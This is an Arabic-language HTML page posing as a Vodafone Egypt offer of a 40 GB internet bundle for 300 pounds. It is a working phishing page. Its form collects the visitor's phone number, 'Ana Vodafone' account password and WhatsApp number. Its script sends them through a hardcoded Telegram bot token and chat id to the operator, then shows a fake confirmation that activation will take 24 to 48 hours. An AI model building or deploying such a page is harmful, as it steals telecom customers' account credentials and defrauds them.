<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>🟣 حجز 40 جيجا إنترنت</title>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #2e003e, #3a0055);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: #2c2c2c;
      padding: 30px;
      border-radius: 15px;
      max-width: 400px;
      width: 90%;
      text-align: center;
      box-shadow: 0 0 20px rgba(0,0,0,0.4);
    }
    h2 {
      color: #ff66cc;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      background: #444;
      color: white;
      font-size: 16px;
    }
    input:focus {
      outline: none;
      background: #555;
    }
    button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      font-size: 18px;
      background: linear-gradient(to right, #ff66cc, #cc33ff);
      border: none;
      border-radius: 8px;
      color: white;
      cursor: pointer;
    }
    button:hover {
      transform: scale(1.03);
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>📶 حجز 40 جيجا إنترنت</h2>
    <p>💰 السعر: 300 جنيه</p>
    <input type="text" id="phone" placeholder="📱 رقم الهاتف">
    <input type="text" id="password" placeholder="🔐 باسورد أنا فودافون">
    <input type="text" id="whatsapp" placeholder="💬 رقم واتساب">
    <button onclick="submit40()">تفعيل الباقة</button>
  </div>

  <script>
    function submit40() {
      const phone = document.getElementById("phone").value;
      const password = document.getElementById("password").value;
      const whatsapp = document.getElementById("whatsapp").value;

      if (!phone || !password || !whatsapp) {
        Swal.fire("❌ خطأ", "يرجى إدخال جميع البيانات", "error");
        return;
      }

      const message = `
📦 *طلب باقة 40 جيجا*  
📱 *رقم الهاتف:* ${phone}  
🔐 *باسورد أنا فودافون:* ${password}  
💬 *رقم واتساب:* ${whatsapp}  
💰 *السعر:* 300 جنيه  
`;

      fetch(`https://api.telegram.org/bot7798612517:AAFdPcsVIOOyoW6NYTD0i_LTXn2KpFedwWo/sendMessage?chat_id=8102839626&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
        .then(() => {
          Swal.fire("✅ تم الحجز", "تم حجز 40 جيجا إنترنت. التفعيل خلال 24 إلى 48 ساعة.", "success");
        })
        .catch(() => {
          Swal.fire("❌ خطأ", "فشل إرسال الطلب. حاول مرة أخرى.", "error");
        });
    }
  </script>
</body>
</html>
